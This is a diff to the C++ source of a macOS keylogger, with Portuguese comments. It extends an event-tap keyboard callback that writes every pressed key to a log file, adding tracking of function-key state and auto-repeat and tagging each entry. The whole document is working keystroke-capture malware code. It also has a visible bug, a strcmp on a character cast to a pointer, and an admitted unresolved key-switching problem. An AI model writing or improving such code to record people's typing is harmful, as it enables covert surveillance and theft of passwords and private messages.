@@ -93,12 +93,18 @@ void Keylogger::initializeMouseTracker() {
 }
 
 
-
-
-
 // ------------------------------------------------------------------------------------------------------------------------------- \\
 // -----------------------------------------------------------   TECLADO   ------------------------------------------------------- \\
 // ------------------------------------------------------------------------------------------------------------------------------- \\
+
+// Estado de teclas de função (shift, cmd, option, ... )
+// 0 = nada acontecendo, não se trata de uma tecla de função
+// 1 = a tecla esta pressionada e o próximo estado é o 2 (será solta)
+// 2 = a tecla não esta mais sendo pressionada e o próximo status é 0
+int fnKeyActive = 0;
+
+// A tecla pressionada anteriormente
+int lastKeyCode = -1;
 
 /**
  * Registra no arquivo de log a tecla pressionada
@@ -108,10 +114,74 @@ CGEventRef Keylogger::CGKeyboardInputEventCallback(CGEventTapProxy proxy, CGEven
 
     // Obtem a tecla pressionada
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+    int64_t isInAutoRepeat = CGEventGetIntegerValueField(event, kCGKeyboardEventAutorepeat);
 
     const char *parsedKey = Keyboard::convertKeyCode(keyCode);
+    bool isFnKey = Keyboard::isFnKey(keyCode);
 
-    logger->write(parsedKey);
+    // Se for uma tecla de função, a variavel [fnKeyActive] começara a ganhar alterações de status
+    if (isFnKey) {
+
+        // Status 1 deve ser aplicado, pois a tecla anterior não é conhecida, ou é diferente, então é o primeiro siclo de uma tecla fn
+        if (lastKeyCode == -1) {
+            fnKeyActive = 1; // status pressionado inicialmente
+            lastKeyCode = keyCode;
+        } else {
+
+            // Se a tecla pressionada agora, for a mesma pressionada antes, deve-se verificar o fnKeyActive para determinar o status
+            if (keyCode == lastKeyCode) {
+
+                // Se estiver no status 1, deve alterar para o status 2.
+                if (fnKeyActive == 1) {
+                    fnKeyActive = 2;
+                } else if (fnKeyActive == 2) { // apenas por precaução, to preocupado só!
+                    fnKeyActive = 1;
+                } else if (fnKeyActive == 0) {
+                    fnKeyActive = 1;
+                }
+
+            } else {
+                // TODO - Problema quando troca de tecla
+
+                if (fnKeyActive == 0) {
+                    fnKeyActive = 1;
+                } else if (fnKeyActive == 1) {
+                    fnKeyActive = 2;
+                } else if (fnKeyActive == 2) {
+                    fnKeyActive = 0;
+                }
+            }
+
+        }
+
+    } else {
+        fnKeyActive = 0;
+    }
+
+    // Armazeno na memória a tecla pressionada no presente, que será a tecla do passado no futuro. 8)
+    lastKeyCode = keyCode;
+
+    if (isFnKey) {
+        logger->write("[f:");
+        logger->write(fnKeyActive);
+        logger->write(parsedKey);
+        logger->write("]");
+    } else {
+        logger->write("[k:");
+        logger->write(isInAutoRepeat);
+
+        // TODO.md K1
+        if (strcmp((const char *) parsedKey[0], (const char *) "[")) {
+            logger->write("[");
+            logger->write(parsedKey);
+            logger->write("]");
+        } else {
+            logger->write(parsedKey);
+        }
+
+        logger->write("]");
+    }
+
 
     return event;
 }
